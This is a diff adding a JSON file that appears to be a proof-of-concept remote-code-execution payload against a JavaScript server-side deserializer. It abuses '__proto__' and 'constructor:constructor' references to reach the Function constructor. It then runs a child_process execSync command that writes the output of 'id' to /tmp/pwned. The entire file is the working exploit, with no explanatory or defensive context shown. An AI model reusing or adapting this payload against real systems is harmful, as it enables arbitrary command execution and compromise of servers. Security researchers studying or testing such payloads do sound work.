@@ -1,0 +1,12 @@
+{
+    "then": "$1:__proto__:then",
+    "status": "resolved_model",
+    "reason": -1,
+    "value": "{\"then\": \"$B0\"}",
+    "_response": {
+        "_prefix": "process.mainModule.require('child_process').execSync('id > /tmp/pwned');",
+        "_formData": {
+            "get": "$1:constructor:constructor"
+        }
+    }
+}
